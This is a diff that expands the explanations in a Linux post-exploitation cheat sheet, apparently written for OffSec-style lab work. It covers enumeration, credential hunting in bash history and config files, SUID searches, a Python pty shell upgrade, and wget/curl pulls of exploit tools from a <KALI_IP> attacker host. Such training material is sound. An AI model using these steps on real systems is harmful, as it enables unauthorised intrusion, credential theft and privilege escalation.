@@ -11,42 +11,42 @@ Fast reference for commands you repeatedly need **after initial access** on Linu
 ```bash
 pwd
 ```
-→ Print working directory — shows where you currently are.
+→ Shows your current absolute path in the filesystem. Essential for orientation after gaining shell access on an unknown system.
 
 ```bash
 ls
 ```
-→ List files in current directory.
+→ Lists all non-hidden files and directories in the current location. Use this to quickly survey what's in a folder.
 
 ```bash
 ls -la
 ```
-→ List all files including hidden ones, with permissions.
+→ Lists all files including hidden ones (dotfiles), with permissions, ownership, and timestamps. The `-a` flag reveals hidden files that a plain `ls` would miss.
 
 ```bash
 cd /path/to/folder
 ```
-→ Change into a directory using its full (absolute) path.
+→ Changes your working directory using the full path from root. Use absolute paths when you need to navigate regardless of where you currently are.
 
 ```bash
 cd foldername
 ```
-→ Change into a folder that's inside your current directory (relative path).
+→ Changes into a subdirectory relative to your current location. Faster than typing the full path when you're already in the right parent directory.
 
 ```bash
 cd ..
 ```
-→ Go up one directory level.
+→ Moves up one level in the directory tree. Chain it (e.g. `cd ../../`) to climb several levels at once.
 
 ```bash
 cd ~
 ```
-→ Go to your home directory from anywhere.
+→ Takes you directly to the current user's home directory. Useful as a quick reset point after navigating deep into the filesystem.
 
 ```bash
 cd -
 ```
-→ Go back to the previous directory you were in. Useful when jumping between two locations.
+→ Returns you to the last directory you were in. Handy for rapidly toggling between two working locations.
 
 ---
 
@@ -78,19 +78,12 @@ cd -
 ```bash
 cat filename
 ```
-→ Print entire file contents to screen.
-
-```bash
-cat /etc/passwd
-```
-→ Always use full path when reading files outside current directory.
+→ Outputs the full contents of a file to the terminal at once. Best for small files; use `less` if the file is long.
 
 ```bash
 less filename
 ```
-→ Read a file page by page. Press `q` to quit, `/word` to search.
-
----
+→ Opens a file in a scrollable viewer that doesn't flood your terminal. Press `/` to search within the file and `q` to exit.
 
 ---
 
@@ -99,27 +92,27 @@ less filename
 ```bash
 whoami
 ```
-→ Current user.
+→ Displays the username of the current process. Quick sanity check after gaining a shell to confirm what account you're running as.
 
 ```bash
 id
 ```
-→ UID, GID, and group memberships. Look for sudo, docker, lxd, disk.
+→ Shows the user's UID, GID, and all group memberships in detail. Key groups like `sudo`, `docker`, `lxd`, and `disk` can each be a direct path to root.
 
 ```bash
 uname -a
 ```
-→ Kernel version — needed for kernel exploit research.
+→ Prints full kernel and OS details including version, architecture, and hostname. Use the kernel version to research known CVEs for local privilege escalation.
 
 ```bash
 cat /etc/os-release
 ```
-→ Distro and version.
+→ Reveals the Linux distribution name and version. Helps narrow down which exploits, package managers, or file paths apply to this system.
 
 ```bash
 cat /etc/passwd
 ```
-→ All local users and their home directories.
+→ Lists all local user accounts with their home directories and default shells. Look for non-standard users or service accounts that may have interesting permissions.
 
 ---
 
@@ -128,7 +121,7 @@ cat /etc/passwd
 ```bash
 sudo -l
 ```
-→ **Always run first.** Shows what the current user can run as root without a password.
+→ **Always run first.** Lists the commands the current user is allowed to run with elevated privileges without a password. A misconfigured sudo entry is one of the most common privesc vectors.
 
 ---
 
@@ -137,12 +130,12 @@ sudo -l
 ```bash
 ps aux
 ```
-→ Every running process with user, PID, and command.
+→ Shows every process running on the system with its owner, PID, and full command line. Use this to spot interesting services, credentials passed as arguments, or processes running as root.
 
 ```bash
 ps aux | grep root
 ```
-→ Only root-owned processes. Use when looking for a process to exploit or dump.
+→ Filters the process list to show only root-owned processes. Focus here for processes that might be exploitable or injectable to escalate privileges.
 
 ---
 
@@ -151,41 +144,36 @@ ps aux | grep root
 ```bash
 ss -tlnp
 ```
-→ Listening ports and owning processes.
+→ Lists all TCP ports currently listening on the machine along with the process owning each one. Helps identify internal services not exposed externally that may be vulnerable.
 
 ```bash
 ip a
 ```
-→ All interfaces and IPs.
+→ Displays all network interfaces and their assigned IP addresses. Use this to identify the machine's subnets and find potential pivot targets.
 
 ---
 
 ## File System
 
 ```bash
-ls -la
-```
-→ List including hidden files.
-
-```bash
 find /home -name "local.txt" 2>/dev/null
 ```
-→ Find the OffSec user flag.
+→ Recursively searches all home directories for the OffSec user flag file. The `2>/dev/null` suppresses permission error noise to keep output clean.
 
 ```bash
 find / -name "*.conf" -o -name "*.bak" 2>/dev/null
 ```
-→ Hunt for config/backup files that may hold credentials.
+→ Searches the entire filesystem for configuration and backup files. These often contain plaintext credentials, API keys, or database connection strings.
 
 ```bash
 find / -perm -4000 -type f 2>/dev/null
 ```
-→ All SUID binaries. Check each on GTFOBins.
+→ Finds every binary on the system with the SUID bit set. SUID binaries run as their owner (often root) regardless of who executes them — check each one on GTFOBins.
 
 ```bash
 cat ~/.bash_history
 ```
-→ Previous commands — may contain plaintext passwords.
+→ Reads the command history for the current user's shell session. Admins sometimes type passwords directly into commands, leaving them exposed here.
 
 ---
 
@@ -194,7 +182,7 @@ cat ~/.bash_history
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
-→ Upgrades a dumb shell to an interactive TTY. Linux only.
+→ Spawns a fully interactive bash shell using Python's pty module. Upgrades a limited reverse shell into a proper TTY so tools like `sudo` and tab completion work correctly.
 
 ---
 
@@ -208,6 +196,7 @@ python3 -m http.server 80
 wget http://<KALI_IP>/file
 curl http://<KALI_IP>/file -o file
 ```
+→ Sets up a temporary HTTP server on Kali to serve files over port 80. The victim machine pulls the file down using `wget` or `curl` — useful for transferring exploit scripts or tools.
 
 ---
 
